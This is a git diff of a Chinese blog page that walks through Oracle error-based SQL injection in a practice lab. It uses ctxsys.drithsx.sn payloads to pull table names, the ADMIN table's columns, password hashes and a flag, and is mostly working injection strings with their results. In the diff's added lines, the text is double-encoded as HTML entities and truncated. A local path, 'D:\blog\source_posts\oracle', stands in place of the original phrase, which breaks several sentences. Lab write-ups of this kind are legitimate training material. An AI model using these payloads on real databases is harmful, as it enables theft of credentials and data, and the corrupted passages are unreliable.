@@ -35,31 +35,31 @@
 
     <!-- OpenGraph -->
  
-    <meta name="description" content="oracle注入报错注入原理：同MYSQL数据库差不多，但是一些语法不同，相比其他数据库，oracle注入报错注入数据库的数据类型更加严谨，由于过度严谨，所以，我们用显错注入，会比较麻烦，于是，我们利用报错的方法，忽视数据类型，直接获取数据CTXSYS.DRITHSX.SN(user,()) oracle注入报错注入 基本的语法：select from all_tables 查询出所有的表 sel">
+    <meta name="description" content="oracle&amp;#x6CE8;&amp;#x5165;&amp;#x62A5;&amp;#x9519;&amp;#x6CE8;&amp;#x5165;&amp;#x539F;&amp;#x7406;&amp;#xFF1A;&amp;#x540C;MYSQL&amp;#x6570;&amp;#x636E;&amp;#x5E93;&amp;#x5DEE;&amp;#x4E0D;&amp;#x591A;&amp;#xFF0C;&amp;#x4F46;&amp;#x662F;&amp;#x4E00;&amp;#x4E9B;&amp;#x8BED;&amp;#x6CD5;&amp;#x4E">
 <meta property="og:type" content="article">
 <meta property="og:title" content="oracle注入报错注入">
 <meta property="og:url" content="https://uruz24.github.io/2021/09/02/oracle%E6%B3%A8%E5%85%A5%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/index.html">
 <meta property="og:site_name" content="niu&#39;s blog">
-<meta property="og:description" content="oracle注入报错注入原理：同MYSQL数据库差不多，但是一些语法不同，相比其他数据库，oracle注入报错注入数据库的数据类型更加严谨，由于过度严谨，所以，我们用显错注入，会比较麻烦，于是，我们利用报错的方法，忽视数据类型，直接获取数据CTXSYS.DRITHSX.SN(user,()) oracle注入报错注入 基本的语法：select from all_tables 查询出所有的表 sel">
+<meta property="og:description" content="oracle&amp;#x6CE8;&amp;#x5165;&amp;#x62A5;&amp;#x9519;&amp;#x6CE8;&amp;#x5165;&amp;#x539F;&amp;#x7406;&amp;#xFF1A;&amp;#x540C;MYSQL&amp;#x6570;&amp;#x636E;&amp;#x5E93;&amp;#x5DEE;&amp;#x4E0D;&amp;#x591A;&amp;#xFF0C;&amp;#x4F46;&amp;#x662F;&amp;#x4E00;&amp;#x4E9B;&amp;#x8BED;&amp;#x6CD5;&amp;#x4E">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://uruz24.github.io/2021/09/02/oracle%E6%B3%A8%E5%85%A5%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/oracle%E6%B3%A8%E5%85%A5%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/01.png">
-<meta property="og:image" content="https://uruz24.github.io/2021/09/02/oracle%E6%B3%A8%E5%85%A5%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/oracle%E6%B3%A8%E5%85%A5%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/02.png">
-<meta property="og:image" content="https://uruz24.github.io/2021/09/02/oracle%E6%B3%A8%E5%85%A5%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/oracle%E6%B3%A8%E5%85%A5%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/03.png">
-<meta property="og:image" content="https://uruz24.github.io/2021/09/02/oracle%E6%B3%A8%E5%85%A5%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/oracle%E6%B3%A8%E5%85%A5%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/04.png">
-<meta property="og:image" content="https://uruz24.github.io/2021/09/02/oracle%E6%B3%A8%E5%85%A5%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/oracle%E6%B3%A8%E5%85%A5%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/05.png">
-<meta property="og:image" content="https://uruz24.github.io/2021/09/02/oracle%E6%B3%A8%E5%85%A5%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/oracle%E6%B3%A8%E5%85%A5%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/06.png">
-<meta property="og:image" content="https://uruz24.github.io/2021/09/02/oracle%E6%B3%A8%E5%85%A5%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/oracle%E6%B3%A8%E5%85%A5%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/07.png">
-<meta property="og:image" content="https://uruz24.github.io/2021/09/02/oracle%E6%B3%A8%E5%85%A5%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/oracle%E6%B3%A8%E5%85%A5%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/08.png">
-<meta property="og:image" content="https://uruz24.github.io/2021/09/02/oracle%E6%B3%A8%E5%85%A5%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/oracle%E6%B3%A8%E5%85%A5%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/09.png">
-<meta property="og:image" content="https://uruz24.github.io/2021/09/02/oracle%E6%B3%A8%E5%85%A5%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/oracle%E6%B3%A8%E5%85%A5%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/10.png">
-<meta property="og:image" content="https://uruz24.github.io/2021/09/02/oracle%E6%B3%A8%E5%85%A5%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/oracle%E6%B3%A8%E5%85%A5%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/11.png">
-<meta property="og:image" content="https://uruz24.github.io/2021/09/02/oracle%E6%B3%A8%E5%85%A5%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/oracle%E6%B3%A8%E5%85%A5%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/12.png">
-<meta property="og:image" content="https://uruz24.github.io/2021/09/02/oracle%E6%B3%A8%E5%85%A5%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/oracle%E6%B3%A8%E5%85%A5%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/13.png">
+<meta property="og:image" content="https://uruz24.github.io/2021/09/02/oracle%E6%B3%A8%E5%85%A5%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/01.png">
+<meta property="og:image" content="https://uruz24.github.io/2021/09/02/oracle%E6%B3%A8%E5%85%A5%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/02.png">
+<meta property="og:image" content="https://uruz24.github.io/2021/09/02/oracle%E6%B3%A8%E5%85%A5%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/03.png">
+<meta property="og:image" content="https://uruz24.github.io/2021/09/02/oracle%E6%B3%A8%E5%85%A5%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/04.png">
+<meta property="og:image" content="https://uruz24.github.io/2021/09/02/oracle%E6%B3%A8%E5%85%A5%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/05.png">
+<meta property="og:image" content="https://uruz24.github.io/2021/09/02/oracle%E6%B3%A8%E5%85%A5%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/06.png">
+<meta property="og:image" content="https://uruz24.github.io/2021/09/02/oracle%E6%B3%A8%E5%85%A5%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/07.png">
+<meta property="og:image" content="https://uruz24.github.io/2021/09/02/oracle%E6%B3%A8%E5%85%A5%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/08.png">
+<meta property="og:image" content="https://uruz24.github.io/2021/09/02/oracle%E6%B3%A8%E5%85%A5%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/09.png">
+<meta property="og:image" content="https://uruz24.github.io/2021/09/02/oracle%E6%B3%A8%E5%85%A5%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/10.png">
+<meta property="og:image" content="https://uruz24.github.io/2021/09/02/oracle%E6%B3%A8%E5%85%A5%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/11.png">
+<meta property="og:image" content="https://uruz24.github.io/2021/09/02/oracle%E6%B3%A8%E5%85%A5%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/12.png">
+<meta property="og:image" content="https://uruz24.github.io/2021/09/02/oracle%E6%B3%A8%E5%85%A5%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/13.png">
 <meta property="article:published_time" content="2021-09-02T14:49:57.913Z">
-<meta property="article:modified_time" content="2021-09-03T04:36:34.724Z">
+<meta property="article:modified_time" content="2021-09-04T07:58:02.358Z">
 <meta property="article:author" content="Peter Niu">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://uruz24.github.io/2021/09/02/oracle%E6%B3%A8%E5%85%A5%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/oracle%E6%B3%A8%E5%85%A5%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/01.png">
+<meta name="twitter:image" content="https://uruz24.github.io/2021/09/02/oracle%E6%B3%A8%E5%85%A5%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/01.png">
 
 
     
@@ -173,44 +173,44 @@
 <article class="post content-card">
     <div class="post__header"></div>
     <div class="post__content">
-        <h4 id="oracle注入报错注入原理："><a href="#oracle注入报错注入原理：" class="headerlink" title="oracle注入报错注入原理："></a>oracle注入报错注入原理：</h4><p>同MYSQL数据库差不多，但是一些语法不同，相比其他数据库，oracle注入报错注入数据库的数据类型更加严谨，由于过度严谨，所以，我们用显错注入，会比较麻烦，于是，我们利用报错的方法，忽视数据类型，直接获取数据<code>CTXSYS.DRITHSX.SN(user,())</code></p>
-<h4 id="oracle注入报错注入-基本的语法："><a href="#oracle注入报错注入-基本的语法：" class="headerlink" title="oracle注入报错注入 基本的语法："></a>oracle注入报错注入 基本的语法：</h4><p><code>select from all_tables</code> 查询出所有的表</p>
-<p><code>select from user_tables</code> 查询出当前用户的表</p>
-<p><code>select from all_tab_columns</code> 查询出所有的字段</p>
-<p><code>select from user_tab_columns</code> 查询出当前用户的字段</p>
-<p><code>select * from v$version</code> 查版本</p>
-<p>mssql系统默认库、表 <code>sysobjects</code>、<code>syscolumns</code> 、<code>sysdatabases</code></p>
-<p>sql系统默认库、表 <code>information_schema.tables</code> 、<code>information_schema.columns</code></p>
-<p>oracel 系统默认库、表 <code>user_table dual</code><br>Dual是一个实表（也有人说它是虚表），如果你直接查询它，它只显示一个X，列名为DUMMY</p>
-<h4 id="dual-虚表"><a href="#dual-虚表" class="headerlink" title="dual 虚表"></a>dual 虚表</h4><p>因为语法要求在查询时一定要加表名<br>例如：<br><code>select 1,2,3,4,5 from dual</code>这样就不会报错，用于把语法补全<br>oracle注入报错注入弱化了库的概念，一个用户可以简单理解为一个库</p>
-<h4 id="本节难点："><a href="#本节难点：" class="headerlink" title="本节难点："></a>本节难点：</h4><p>如何实现limit 功能？<br>oracle注入报错注入 中利用<code>rownum=1</code>可以取一行数据</p>
-<p>当<code>rownum&lt;3</code>可以取两条</p>
-<p>当 <code>rownum&lt;5</code>可以取四条<br>rownum 的值会根据查询结果进行改变<br>语句如下可以完成limit功能<br><code>select username from(select rownum r, username from all users) where r=1</code><br>子查询返回一个结果集，结果集也可以看作是一个表，其中‘r’表示一个别名，在这一句中就是rownum的别名</p>
-<p>进入靶场<br>发现id传参，and 1=1，网页显示正常</p>
-<p><img src="oracle%E6%B3%A8%E5%85%A5%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/01.png" alt="01"></p>
-<p><code>and 1=2</code> 报错，表示与数据库有交互</p>
-<p><img src="oracle%E6%B3%A8%E5%85%A5%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/02.png" alt="02"><br>查字段，<br><code>order by 4</code> 显示正常</p>
-<p><img src="oracle%E6%B3%A8%E5%85%A5%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/03.png" alt="03"></p>
-<p><code>order by 5</code> 报错，有4个字段</p>
-<p><img src="oracle%E6%B3%A8%E5%85%A5%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/04.png" alt="04"></p>
-<p>联合查询,因为oracle注入报错注入数据库对数据类型要求很严格，所以使用语句<br><code>union all select null,null,null,null from dual</code> </p>
-<p><img src="oracle%E6%B3%A8%E5%85%A5%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/05.png" alt="05"><br>下面使用oracle注入报错注入方法</p>
-<h4 id="优点："><a href="#优点：" class="headerlink" title="优点："></a>优点：</h4><p>可以不考虑类型</p>
-<h4 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h4><p>在数据库中对查询相应的关键词，然后查询失败，爆出数据</p>
-<h4 id="函数：ctxsys-drithsx-sn-user-select-banner-from-v-version-where-rownum-1"><a href="#函数：ctxsys-drithsx-sn-user-select-banner-from-v-version-where-rownum-1" class="headerlink" title="函数：ctxsys.drithsx.sn(user,(select banner from v$version where rownum=1))"></a>函数：<code>ctxsys.drithsx.sn(user,(select banner from v$version where rownum=1))</code></h4><p>这个函数就是一个查询，而子查询优先进行，所以当查询函数查不到的时候，就会报错，但是我们真正要的数据在子查询里已经查过了，通过报错显示出来<br>查表名<br><code>and 1=ctxsys.drithsx.sn(1,(select table_name from user_tables where rownum=1))</code></p>
-<p><img src="oracle%E6%B3%A8%E5%85%A5%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/06.png" alt="06"><br>得到表名NEWS<br>查其他表<br><code>and 1=ctxsys.drithsx.sn(1,(select table_name from user_tables where rownum=1 and table_name &lt;&gt;&#39;NEWS&#39;))</code></p>
-<p><img src="oracle%E6%B3%A8%E5%85%A5%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/07.png" alt="07"></p>
-<p>得到ADMIN表<br>查字段<br><code>and 1=ctxsys.drithsx.sn(1,(select column_name from user_tab_columns where table_name=&#39;ADMIN&#39; and rownum=1))</code></p>
-<p><img src="oracle%E6%B3%A8%E5%85%A5%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/08.png" alt="08"><br>得到ID 字段<br>查其他字段<br><code>and 1=ctxsys.drithsx.sn(1,(select column_name from user_tab_columns where  rownum=1 and table_name =&#39;ADMIN&#39; and column_name&lt;&gt;&#39;ID&#39;))</code></p>
-<p><img src="oracle%E6%B3%A8%E5%85%A5%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/09.png" alt="09"><br>得到字段UNAME<br>再查其他字段<br><code>and 1=ctxsys.drithsx.sn(1,(select column_name from user_tab_columns where  rownum=1 and table_name =&#39;ADMIN&#39; and column_name&lt;&gt;&#39;ID&#39; and  column_name&lt;&gt;&#39;UNAME&#39;))</code></p>
-<p><img src="oracle%E6%B3%A8%E5%85%A5%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/10.png" alt="10"><br>得到字段UPASS<br>查内容<br><code>and 1=ctxsys.drithsx.sn(1,(select UPASS from ADMIN where rownum=1 ))</code></p>
-<p><img src="oracle%E6%B3%A8%E5%85%A5%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/11.png" alt="11"><br>得到数据：<code>f583aea84b6ded258f529205eb6d56a7</code><br>继续查其他数据<br><code>and 1=ctxsys.drithsx.sn(1,(select UPASS from ADMIN where rownum=1 and UPASS &lt;&gt; &#39;f583aea84b6ded258f529205eb6d56a7&#39;))</code></p>
-<p><img src="oracle%E6%B3%A8%E5%85%A5%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/12.png" alt="12"><br>试过发现这个也不是flag，继续<br><code>and 1=ctxsys.drithsx.sn(1,(select UPASS from ADMIN where rownum=1 and UPASS &lt;&gt; &#39;f583aea84b6ded258f529205eb6d56a7&#39; and UPASS &lt;&gt;  &#39;9e8e7f6953dd11ceccc6ce655e03e070&#39;))</code></p>
-<p><img src="oracle%E6%B3%A8%E5%85%A5%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/13.png" alt="13"><br>得到flag：<br><code>2a61f8bcfe7535eadcfa69eb4406ceb9</code><br>输入通关</p>
+        <h4 id="oracle&#x6CE8;&#x5165;&#x62A5;&#x9519;&#x6CE8;&#x5165;&#x539F;&#x7406;&#xFF1A;"><a href="#oracle&#x6CE8;&#x5165;&#x62A5;&#x9519;&#x6CE8;&#x5165;&#x539F;&#x7406;&#xFF1A;" class="headerlink" title="oracle&#x6CE8;&#x5165;&#x62A5;&#x9519;&#x6CE8;&#x5165;&#x539F;&#x7406;&#xFF1A;"></a>oracle&#x6CE8;&#x5165;&#x62A5;&#x9519;&#x6CE8;&#x5165;&#x539F;&#x7406;&#xFF1A;</h4><p>&#x540C;MYSQL&#x6570;&#x636E;&#x5E93;&#x5DEE;&#x4E0D;&#x591A;&#xFF0C;&#x4F46;&#x662F;&#x4E00;&#x4E9B;&#x8BED;&#x6CD5;&#x4E0D;&#x540C;&#xFF0C;&#x76F8;&#x6BD4;&#x5176;&#x4ED6;&#x6570;&#x636E;&#x5E93;&#xFF0C;D:\blog\source_posts\oracle&#x6570;&#x636E;&#x5E93;&#x7684;&#x6570;&#x636E;&#x7C7B;&#x578B;&#x66F4;&#x52A0;&#x4E25;&#x8C28;&#xFF0C;&#x7531;&#x4E8E;&#x8FC7;&#x5EA6;&#x4E25;&#x8C28;&#xFF0C;&#x6240;&#x4EE5;&#xFF0C;&#x6211;&#x4EEC;&#x7528;&#x663E;&#x9519;&#x6CE8;&#x5165;&#xFF0C;&#x4F1A;&#x6BD4;&#x8F83;&#x9EBB;&#x70E6;&#xFF0C;&#x4E8E;&#x662F;&#xFF0C;&#x6211;&#x4EEC;&#x5229;&#x7528;&#x62A5;&#x9519;&#x7684;&#x65B9;&#x6CD5;&#xFF0C;&#x5FFD;&#x89C6;&#x6570;&#x636E;&#x7C7B;&#x578B;&#xFF0C;&#x76F4;&#x63A5;&#x83B7;&#x53D6;&#x6570;&#x636E;<code>CTXSYS.DRITHSX.SN(user,())</code></p>
+<h4 id="oracle&#x6CE8;&#x5165;&#x62A5;&#x9519;&#x6CE8;&#x5165;-&#x57FA;&#x672C;&#x7684;&#x8BED;&#x6CD5;&#xFF1A;"><a href="#oracle&#x6CE8;&#x5165;&#x62A5;&#x9519;&#x6CE8;&#x5165;-&#x57FA;&#x672C;&#x7684;&#x8BED;&#x6CD5;&#xFF1A;" class="headerlink" title="oracle&#x6CE8;&#x5165;&#x62A5;&#x9519;&#x6CE8;&#x5165; &#x57FA;&#x672C;&#x7684;&#x8BED;&#x6CD5;&#xFF1A;"></a>oracle&#x6CE8;&#x5165;&#x62A5;&#x9519;&#x6CE8;&#x5165; &#x57FA;&#x672C;&#x7684;&#x8BED;&#x6CD5;&#xFF1A;</h4><p><code>select from all_tables</code> &#x67E5;&#x8BE2;&#x51FA;&#x6240;&#x6709;&#x7684;&#x8868;</p>
+<p><code>select from user_tables</code> &#x67E5;&#x8BE2;&#x51FA;&#x5F53;&#x524D;&#x7528;&#x6237;&#x7684;&#x8868;</p>
+<p><code>select from all_tab_columns</code> &#x67E5;&#x8BE2;&#x51FA;&#x6240;&#x6709;&#x7684;&#x5B57;&#x6BB5;</p>
+<p><code>select from user_tab_columns</code> &#x67E5;&#x8BE2;&#x51FA;&#x5F53;&#x524D;&#x7528;&#x6237;&#x7684;&#x5B57;&#x6BB5;</p>
+<p><code>select * from v$version</code> &#x67E5;&#x7248;&#x672C;</p>
+<p>mssql&#x7CFB;&#x7EDF;&#x9ED8;&#x8BA4;&#x5E93;&#x3001;&#x8868; <code>sysobjects</code>&#x3001;<code>syscolumns</code> &#x3001;<code>sysdatabases</code></p>
+<p>sql&#x7CFB;&#x7EDF;&#x9ED8;&#x8BA4;&#x5E93;&#x3001;&#x8868; <code>information_schema.tables</code> &#x3001;<code>information_schema.columns</code></p>
+<p>oracel &#x7CFB;&#x7EDF;&#x9ED8;&#x8BA4;&#x5E93;&#x3001;&#x8868; <code>user_table dual</code><br>Dual&#x662F;&#x4E00;&#x4E2A;&#x5B9E;&#x8868;&#xFF08;&#x4E5F;&#x6709;&#x4EBA;&#x8BF4;&#x5B83;&#x662F;&#x865A;&#x8868;&#xFF09;&#xFF0C;&#x5982;&#x679C;&#x4F60;&#x76F4;&#x63A5;&#x67E5;&#x8BE2;&#x5B83;&#xFF0C;&#x5B83;&#x53EA;&#x663E;&#x793A;&#x4E00;&#x4E2A;X&#xFF0C;&#x5217;&#x540D;&#x4E3A;DUMMY</p>
+<h4 id="dual-&#x865A;&#x8868;"><a href="#dual-&#x865A;&#x8868;" class="headerlink" title="dual &#x865A;&#x8868;"></a>dual &#x865A;&#x8868;</h4><p>&#x56E0;&#x4E3A;&#x8BED;&#x6CD5;&#x8981;&#x6C42;&#x5728;&#x67E5;&#x8BE2;&#x65F6;&#x4E00;&#x5B9A;&#x8981;&#x52A0;&#x8868;&#x540D;<br>&#x4F8B;&#x5982;&#xFF1A;<br><code>select 1,2,3,4,5 from dual</code>&#x8FD9;&#x6837;&#x5C31;&#x4E0D;&#x4F1A;&#x62A5;&#x9519;&#xFF0C;&#x7528;&#x4E8E;&#x628A;&#x8BED;&#x6CD5;&#x8865;&#x5168;<br>D:\blog\source_posts\oracle&#x5F31;&#x5316;&#x4E86;&#x5E93;&#x7684;&#x6982;&#x5FF5;&#xFF0C;&#x4E00;&#x4E2A;&#x7528;&#x6237;&#x53EF;&#x4EE5;&#x7B80;&#x5355;&#x7406;&#x89E3;&#x4E3A;&#x4E00;&#x4E2A;&#x5E93;</p>
+<h4 id="&#x672C;&#x8282;&#x96BE;&#x70B9;&#xFF1A;"><a href="#&#x672C;&#x8282;&#x96BE;&#x70B9;&#xFF1A;" class="headerlink" title="&#x672C;&#x8282;&#x96BE;&#x70B9;&#xFF1A;"></a>&#x672C;&#x8282;&#x96BE;&#x70B9;&#xFF1A;</h4><p>&#x5982;&#x4F55;&#x5B9E;&#x73B0;limit &#x529F;&#x80FD;&#xFF1F;<br>D:\blog\source_posts\oracle &#x4E2D;&#x5229;&#x7528;<code>rownum=1</code>&#x53EF;&#x4EE5;&#x53D6;&#x4E00;&#x884C;&#x6570;&#x636E;</p>
+<p>&#x5F53;<code>rownum&lt;3</code>&#x53EF;&#x4EE5;&#x53D6;&#x4E24;&#x6761;</p>
+<p>&#x5F53; <code>rownum&lt;5</code>&#x53EF;&#x4EE5;&#x53D6;&#x56DB;&#x6761;<br>rownum &#x7684;&#x503C;&#x4F1A;&#x6839;&#x636E;&#x67E5;&#x8BE2;&#x7ED3;&#x679C;&#x8FDB;&#x884C;&#x6539;&#x53D8;<br>&#x8BED;&#x53E5;&#x5982;&#x4E0B;&#x53EF;&#x4EE5;&#x5B8C;&#x6210;limit&#x529F;&#x80FD;<br><code>select username from(select rownum r, username from all users) where r=1</code><br>&#x5B50;&#x67E5;&#x8BE2;&#x8FD4;&#x56DE;&#x4E00;&#x4E2A;&#x7ED3;&#x679C;&#x96C6;&#xFF0C;&#x7ED3;&#x679C;&#x96C6;&#x4E5F;&#x53EF;&#x4EE5;&#x770B;&#x4F5C;&#x662F;&#x4E00;&#x4E2A;&#x8868;&#xFF0C;&#x5176;&#x4E2D;&#x2018;r&#x2019;&#x8868;&#x793A;&#x4E00;&#x4E2A;&#x522B;&#x540D;&#xFF0C;&#x5728;&#x8FD9;&#x4E00;&#x53E5;&#x4E2D;&#x5C31;&#x662F;rownum&#x7684;&#x522B;&#x540D;</p>
+<p>&#x8FDB;&#x5165;&#x9776;&#x573A;<br>&#x53D1;&#x73B0;id&#x4F20;&#x53C2;&#xFF0C;and 1=1&#xFF0C;&#x7F51;&#x9875;&#x663E;&#x793A;&#x6B63;&#x5E38;</p>
+<p><img src="/2021/09/02/oracle%E6%B3%A8%E5%85%A5%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/01.png" alt="01"></p>
+<p><code>and 1=2</code> &#x62A5;&#x9519;&#xFF0C;&#x8868;&#x793A;&#x4E0E;&#x6570;&#x636E;&#x5E93;&#x6709;&#x4EA4;&#x4E92;</p>
+<p><img src="/2021/09/02/oracle%E6%B3%A8%E5%85%A5%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/02.png" alt="02"><br>&#x67E5;&#x5B57;&#x6BB5;&#xFF0C;<br><code>order by 4</code> &#x663E;&#x793A;&#x6B63;&#x5E38;</p>
+<p><img src="/2021/09/02/oracle%E6%B3%A8%E5%85%A5%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/03.png" alt="03"></p>
+<p><code>order by 5</code> &#x62A5;&#x9519;&#xFF0C;&#x6709;4&#x4E2A;&#x5B57;&#x6BB5;</p>
+<p><img src="/2021/09/02/oracle%E6%B3%A8%E5%85%A5%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/04.png" alt="04"></p>
+<p>&#x8054;&#x5408;&#x67E5;&#x8BE2;,&#x56E0;&#x4E3A;D:\blog\source_posts\oracle&#x6570;&#x636E;&#x5E93;&#x5BF9;&#x6570;&#x636E;&#x7C7B;&#x578B;&#x8981;&#x6C42;&#x5F88;&#x4E25;&#x683C;&#xFF0C;&#x6240;&#x4EE5;&#x4F7F;&#x7528;&#x8BED;&#x53E5;<br><code>union all select null,null,null,null from dual</code> </p>
+<p><img src="/2021/09/02/oracle%E6%B3%A8%E5%85%A5%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/05.png" alt="05"><br>&#x4E0B;&#x9762;&#x4F7F;&#x7528;D:\blog\source_posts\oracle&#x65B9;&#x6CD5;</p>
+<h4 id="&#x4F18;&#x70B9;&#xFF1A;"><a href="#&#x4F18;&#x70B9;&#xFF1A;" class="headerlink" title="&#x4F18;&#x70B9;&#xFF1A;"></a>&#x4F18;&#x70B9;&#xFF1A;</h4><p>&#x53EF;&#x4EE5;&#x4E0D;&#x8003;&#x8651;&#x7C7B;&#x578B;</p>
+<h4 id="&#x539F;&#x7406;&#xFF1A;"><a href="#&#x539F;&#x7406;&#xFF1A;" class="headerlink" title="&#x539F;&#x7406;&#xFF1A;"></a>&#x539F;&#x7406;&#xFF1A;</h4><p>&#x5728;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x5BF9;&#x67E5;&#x8BE2;&#x76F8;&#x5E94;&#x7684;&#x5173;&#x952E;&#x8BCD;&#xFF0C;&#x7136;&#x540E;&#x67E5;&#x8BE2;&#x5931;&#x8D25;&#xFF0C;&#x7206;&#x51FA;&#x6570;&#x636E;</p>
+<h4 id="&#x51FD;&#x6570;&#xFF1A;ctxsys-drithsx-sn-user-select-banner-from-v-version-where-rownum-1"><a href="#&#x51FD;&#x6570;&#xFF1A;ctxsys-drithsx-sn-user-select-banner-from-v-version-where-rownum-1" class="headerlink" title="&#x51FD;&#x6570;&#xFF1A;ctxsys.drithsx.sn(user,(select banner from v$version where rownum=1))"></a>&#x51FD;&#x6570;&#xFF1A;<code>ctxsys.drithsx.sn(user,(select banner from v$version where rownum=1))</code></h4><p>&#x8FD9;&#x4E2A;&#x51FD;&#x6570;&#x5C31;&#x662F;&#x4E00;&#x4E2A;&#x67E5;&#x8BE2;&#xFF0C;&#x800C;&#x5B50;&#x67E5;&#x8BE2;&#x4F18;&#x5148;&#x8FDB;&#x884C;&#xFF0C;&#x6240;&#x4EE5;&#x5F53;&#x67E5;&#x8BE2;&#x51FD;&#x6570;&#x67E5;&#x4E0D;&#x5230;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x5C31;&#x4F1A;&#x62A5;&#x9519;&#xFF0C;&#x4F46;&#x662F;&#x6211;&#x4EEC;&#x771F;&#x6B63;&#x8981;&#x7684;&#x6570;&#x636E;&#x5728;&#x5B50;&#x67E5;&#x8BE2;&#x91CC;&#x5DF2;&#x7ECF;&#x67E5;&#x8FC7;&#x4E86;&#xFF0C;&#x901A;&#x8FC7;&#x62A5;&#x9519;&#x663E;&#x793A;&#x51FA;&#x6765;<br>&#x67E5;&#x8868;&#x540D;<br><code>and 1=ctxsys.drithsx.sn(1,(select table_name from user_tables where rownum=1))</code></p>
+<p><img src="/2021/09/02/oracle%E6%B3%A8%E5%85%A5%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/06.png" alt="06"><br>&#x5F97;&#x5230;&#x8868;&#x540D;NEWS<br>&#x67E5;&#x5176;&#x4ED6;&#x8868;<br><code>and 1=ctxsys.drithsx.sn(1,(select table_name from user_tables where rownum=1 and table_name &lt;&gt;&apos;NEWS&apos;))</code></p>
+<p><img src="/2021/09/02/oracle%E6%B3%A8%E5%85%A5%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/07.png" alt="07"></p>
+<p>&#x5F97;&#x5230;ADMIN&#x8868;<br>&#x67E5;&#x5B57;&#x6BB5;<br><code>and 1=ctxsys.drithsx.sn(1,(select column_name from user_tab_columns where table_name=&apos;ADMIN&apos; and rownum=1))</code></p>
+<p><img src="/2021/09/02/oracle%E6%B3%A8%E5%85%A5%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/08.png" alt="08"><br>&#x5F97;&#x5230;ID &#x5B57;&#x6BB5;<br>&#x67E5;&#x5176;&#x4ED6;&#x5B57;&#x6BB5;<br><code>and 1=ctxsys.drithsx.sn(1,(select column_name from user_tab_columns where  rownum=1 and table_name =&apos;ADMIN&apos; and column_name&lt;&gt;&apos;ID&apos;))</code></p>
+<p><img src="/2021/09/02/oracle%E6%B3%A8%E5%85%A5%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/09.png" alt="09"><br>&#x5F97;&#x5230;&#x5B57;&#x6BB5;UNAME<br>&#x518D;&#x67E5;&#x5176;&#x4ED6;&#x5B57;&#x6BB5;<br><code>and 1=ctxsys.drithsx.sn(1,(select column_name from user_tab_columns where  rownum=1 and table_name =&apos;ADMIN&apos; and column_name&lt;&gt;&apos;ID&apos; and  column_name&lt;&gt;&apos;UNAME&apos;))</code></p>
